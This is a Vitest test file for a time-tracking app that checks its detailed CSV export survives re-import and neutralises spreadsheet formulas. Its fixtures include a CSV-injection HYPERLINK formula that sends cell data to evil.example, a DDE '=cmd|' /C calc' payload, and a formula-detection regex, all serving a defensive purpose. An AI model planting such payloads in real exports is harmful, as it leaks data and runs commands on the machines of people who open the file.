/**
 * THE DETAILED CSV, EXPORTED AND IMPORTED BACK, IS THE SAME TIME — AND NO CELL IN IT
 * IS A LIVE SPREADSHEET FORMULA.
 *
 * Found by the heavy-user audit of 2026-11-04 (D2, D3), exporting three months and
 * importing the file into an emptied account through Settings → Data:
 *
 *   - two projects named "Website", one for Client A and one for Client B, came back
 *     as ONE project, because the import matched a project by its name alone;
 *   - the tag "deep, focus" came back as two tags, "deep" and "focus", because the
 *     export joined tags with ", " and the import splits on commas;
 *   - a description reading `=HYPERLINK("http://evil.example/?x="&A1,"Click me")` was
 *     written as a formula cell, which a spreadsheet runs when the file is opened
 *     (OWASP's "CSV injection").
 *
 * The import still reads a file Toggl wrote, and one this app wrote before the fix:
 * Toggl's own export joins tags with ", " as well, so a plain "meeting, deep" is two
 * tags exactly as it always was.
 */

import { describe, expect, test } from "vitest"

import { neutraliseCsvText, restoreCsvText } from "@/src/shared/csvCell"
import { importEntriesCsv, parseCsvRows } from "@/src/timetrack/importExportService"
import { epochSeconds } from "@/src/timetrack/timetrackFormatService"
import {
  buildDetailed,
  buildProfitability,
  defaultReportConfig,
  detailedToCsv,
  emptyFilters,
  profitabilityToCsv,
  summaryToCsv,
  buildSummary,
} from "@/src/timetrack/reportsService"
import type { ReportConfig, TimetrackState } from "@/src/timetrack/types"

import { NOW_ISO, baseState, entry } from "./helpers"

const NOW_SEC = epochSeconds(NOW_ISO)
const FORMULA = '=HYPERLINK("http://evil.example/?x="&A1,"Click me")'

function weekConfig(): ReportConfig {
  const base = defaultReportConfig("2026-08-10", 1, { enabled: false, mode: "nearest", minutes: 15 })
  return { ...base, filters: emptyFilters({ start: "2026-08-03", end: "2026-08-10" }) }
}

function heavyishWorkspace(): TimetrackState {
  const base = baseState()
  const website = (id: string, clientId: string) => ({ ...base.projects[1], id, clientId, name: "Website", fixedFee: null })
  return baseState({
    clients: [
      { id: "21", workspaceId: "1", name: "Client A", archived: false, at: NOW_ISO },
      { id: "22", workspaceId: "1", name: "Client B", archived: false, at: NOW_ISO },
    ],
    projects: [website("61", "21"), website("62", "22")],
    tasks: [],
    tags: [
      { id: "70", workspaceId: "1", name: "deep, focus", at: NOW_ISO },
      { id: "71", workspaceId: "1", name: "admin", at: NOW_ISO },
      { id: "72", workspaceId: "1", name: "C:\\work; home", at: NOW_ISO },
    ],
    entries: [
      entry(1, "2026-08-04", "09:00", "10:00", { description: "site for A", projectId: "61", tagIds: ["70"], billable: false }),
      entry(2, "2026-08-05", "09:00", "10:00", { description: "site for B", projectId: "62", tagIds: ["70", "71"], billable: false }),
      entry(3, "2026-08-06", "09:00", "10:00", { description: FORMULA, projectId: null, tagIds: ["72"], billable: false }),
      entry(4, "2026-08-07", "09:00", "10:00", { description: "'=already quoted", projectId: null, billable: false }),
      entry(5, "2026-08-07", "11:00", "12:00", { description: "-5 minutes late", projectId: null, billable: false }),
      entry(6, "2026-08-07", "13:00", "14:00", { description: "@mention", projectId: null, billable: false }),
      entry(7, "2026-08-07", "15:00", "16:00", { description: "+1 call", projectId: null, billable: false }),
      // a spreadsheet in a locale that splits on `;`
      entry(9, "2026-08-08", "11:00", "12:00", { description: "notes;=cmd|' /C calc'!A0", projectId: null, billable: false }),
    ],
  })
}

function emptyWorkspace(): TimetrackState {
  return baseState({ clients: [], projects: [], tasks: [], tags: [], entries: [] })
}

/** What a person would compare: per start instant, the words, the project and client, the tags */
function described(state: TimetrackState) {
  return state.entries
    .map((e) => {
      const project = state.projects.find((p) => p.id === e.projectId)
      const client = state.clients.find((c) => c.id === project?.clientId)
      return {
        start: epochSeconds(e.start),
        description: e.description,
        project: project ? `${project.name} / ${client?.name ?? "(no client)"}` : "(none)",
        tags: e.tagIds.map((id) => state.tags.find((t) => t.id === id)?.name ?? "?").sort(),
        duration: e.duration,
      }
    })
    .sort((a, b) => a.start - b.start)
}

describe("the Detailed CSV round trip", () => {
  test("gives back the same entries, projects told apart by client, tags whole", () => {
    const original = heavyishWorkspace()
    const csv = detailedToCsv(buildDetailed(original, weekConfig(), NOW_SEC), "EUR")

    const back = importEntriesCsv(emptyWorkspace(), csv, NOW_ISO)

    expect(back.skipped).toEqual([])
    expect(back.state.projects, "two projects named Website came back as one").toHaveLength(2)
    expect(back.state.tags.map((t) => t.name).sort()).toEqual(["C:\\work; home", "admin", "deep, focus"])
    expect(described(back.state)).toEqual(described(original))
  })

  test("writes no cell a spreadsheet would run as a formula", () => {
    const csv = detailedToCsv(buildDetailed(heavyishWorkspace(), weekConfig(), NOW_SEC), "EUR")
    const cells = parseCsvRows(csv).flat()

    const live = cells.filter((cell) => /^\s*[=+\-@\t\r]/.test(cell) && !/^-?\d+(\.\d+)?$/.test(cell))
    expect(live, "these cells start a formula").toEqual([])
    expect(cells).toContain(`'${FORMULA}`)
    // split the way a `;` spreadsheet splits: only quoted text may hold a `;`
    const unquoted = csv.replace(/"(?:[^"]|"")*"/g, "")
    expect(unquoted.split(/[;,\n]/).filter((part) => /^\s*=/.test(part)), "a `;` split exposes a formula").toEqual([])
    // a spreadsheet that trims a cell before reading it; the import trims descriptions
    // anyway, so this one is checked on the cell itself
    expect(neutraliseCsvText("  =1+1")).toBe("'  =1+1")
    expect(restoreCsvText(neutraliseCsvText("  =1+1"))).toBe("  =1+1")
  })

  test("leaves numbers readable as numbers, negative ones included", () => {
    // Beta has a fixed fee of 1000 and no rate, and the labour cost is 30/h, so an
    // hour on it has a cost and no revenue: a negative profit on the row
    const state = baseState({ entries: [entry(1, "2026-08-10", "09:00", "10:00", { projectId: "31", billable: false })] })
    const report = buildProfitability(state, { ...weekConfig(), grouping: "description" }, NOW_SEC)
    const row = parseCsvRows(profitabilityToCsv(report, "Description", "EUR"))[1]

    expect(row[6], "the profit cell").toBe("-30.00")
    expect(row[7], "the margin cell").toBe("—")
    const summary = parseCsvRows(summaryToCsv(buildSummary(state, weekConfig(), NOW_SEC), "Project"))[1]
    expect(summary[1]).toBe("1:00:00")
  })

  test("still reads Toggl's own CSV, where a comma in the Tags cell separates two tags", () => {
    const toggl = [
      "User,Email,Client,Project,Task,Description,Billable,Start date,Start time,End date,End time,Duration,Tags",
      'You,you@example.com,Client A,Website,,planning,No,2026-08-10,09:00:00,2026-08-10,10:00:00,01:00:00,"meeting, deep"',
      "You,you@example.com,,Website,,no client here,No,2026-08-10,11:00:00,2026-08-10,12:00:00,01:00:00,",
    ].join("\n")

    const result = importEntriesCsv(emptyWorkspace(), toggl, NOW_ISO)

    expect(result.imported).toBe(2)
    expect(result.state.tags.map((t) => t.name).sort()).toEqual(["deep", "meeting"])
    // a Website for Client A, and a Website with no client: two different projects
    expect(result.state.projects.map((p) => p.clientId === null).sort()).toEqual([false, true])
  })
})
